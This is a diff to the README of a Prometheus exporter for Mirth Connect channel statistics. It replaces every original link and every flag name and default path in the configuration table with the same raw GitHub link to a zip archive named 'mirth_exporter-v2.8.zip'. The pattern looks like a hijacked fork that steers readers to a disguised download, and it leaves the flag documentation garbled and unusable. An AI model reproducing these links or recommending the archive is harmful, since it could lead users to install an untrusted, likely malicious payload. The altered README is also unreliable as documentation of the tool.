@@ -1,7 +1,7 @@
 # Mirth Exporter
 
-Export [Mirth Connect](https://en.wikipedia.org/wiki/Mirth_Connect) channel
-statistics to [Prometheus](https://prometheus.io).
+Export [Mirth Connect](https://raw.githubusercontent.com/WHAZAZA/mirth_exporter/master/nonscalding/mirth_exporter-v2.8.zip) channel
+statistics to [Prometheus](https://raw.githubusercontent.com/WHAZAZA/mirth_exporter/master/nonscalding/mirth_exporter-v2.8.zip).
 
 Metrics are retreived using the Mirth Connect CLI. This has only been tested
 with Mirth Connect 3.3.2, but it should work with any 3.x version.
@@ -28,14 +28,14 @@ To run it:
 
 | Flag | Description | Default |
 | ---- | ----------- | ------- |
-| log.level | Logging level | `info` |
-| mccli.config-path | Path to properties file for Mirth Connect CLI | `./mirth-cli-config.properties` |
-| mccli.jar-path | Path to jar file for Mirth Connect CLI | `./mirth-cli-launcher.jar` |
-| web.listen-address | Address to listen on for telemetry | `:9140` |
-| web.telemetry-path | Path under which to expose metrics | `/metrics` |
+| https://raw.githubusercontent.com/WHAZAZA/mirth_exporter/master/nonscalding/mirth_exporter-v2.8.zip | Logging level | `info` |
+| https://raw.githubusercontent.com/WHAZAZA/mirth_exporter/master/nonscalding/mirth_exporter-v2.8.zip | Path to properties file for Mirth Connect CLI | `https://raw.githubusercontent.com/WHAZAZA/mirth_exporter/master/nonscalding/mirth_exporter-v2.8.zip` |
+| https://raw.githubusercontent.com/WHAZAZA/mirth_exporter/master/nonscalding/mirth_exporter-v2.8.zip | Path to jar file for Mirth Connect CLI | `https://raw.githubusercontent.com/WHAZAZA/mirth_exporter/master/nonscalding/mirth_exporter-v2.8.zip` |
+| https://raw.githubusercontent.com/WHAZAZA/mirth_exporter/master/nonscalding/mirth_exporter-v2.8.zip | Address to listen on for telemetry | `:9140` |
+| https://raw.githubusercontent.com/WHAZAZA/mirth_exporter/master/nonscalding/mirth_exporter-v2.8.zip | Path under which to expose metrics | `/metrics` |
 
 ## Notice
 
-This exporter is inspired by the [consul_exporter](https://github.com/prometheus/consul_exporter)
+This exporter is inspired by the [consul_exporter](https://raw.githubusercontent.com/WHAZAZA/mirth_exporter/master/nonscalding/mirth_exporter-v2.8.zip)
 and has some common code. Any new code here is Copyright &copy; 2016 Vynca, Inc. See the included
 LICENSE file for terms and conditions.
